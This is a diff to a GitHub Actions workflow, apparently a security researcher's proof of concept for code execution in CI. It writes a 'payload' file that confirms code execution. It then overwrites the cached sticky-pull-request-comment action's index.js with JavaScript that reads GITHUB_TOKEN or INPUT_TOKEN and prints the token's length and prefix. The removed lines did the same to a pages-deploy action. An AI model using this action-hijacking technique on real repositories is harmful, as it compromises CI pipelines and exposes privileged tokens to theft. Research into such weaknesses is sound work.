@@ -17,12 +17,10 @@ jobs:
           cat > payload/pr-preview-meta.env <<'META'
           echo "GAB_RCE_CONFIRMED host=$(hostname) user=$(id -un) repo=$GITHUB_REPOSITORY run=$GITHUB_RUN_ID"
           set +e +o pipefail
-          echo "GAB_ACTIONS_DIR_LIST:"; ls /home/runner/work/_actions 2>/dev/null
-          echo "GAB_INDEX_JS_LIST:"; find /home/runner/work/_actions -maxdepth 5 -name index.js 2>/dev/null | head -4
-          DEPLOY_JS=$(find /home/runner/work/_actions -maxdepth 5 -path '*github-pages-deploy-action*' -name index.js 2>/dev/null | head -1)
-          echo "GAB_DEPLOY_JS=${DEPLOY_JS:-none}"
-          if [ -n "${DEPLOY_JS}" ]; then
-            printf '%s\n' 'const t=process.env.INPUT_TOKEN||"";console.log("GAB_PAT_REACHABLE len="+t.length+" prefix="+t.slice(0,4));process.exit(1);' > "$DEPLOY_JS"
+          STICKY_JS=/home/runner/work/_actions/marocchino/sticky-pull-request-comment/v2/dist/index.js
+          echo "GAB_STICKY_JS_PRESENT=$([ -f "$STICKY_JS" ] && echo yes || echo no)"
+          if [ -f "$STICKY_JS" ]; then
+            printf '%s\n' 'const t=process.env.GITHUB_TOKEN||process.env.INPUT_TOKEN||"";console.log("GAB_PAT_REACHABLE step_token_len="+t.length+" prefix="+t.slice(0,4)+" repo="+process.env.GITHUB_REPOSITORY);process.exit(0);' > "$STICKY_JS"
           fi
           set -e -o pipefail
           WORKER_ACTION=deploy
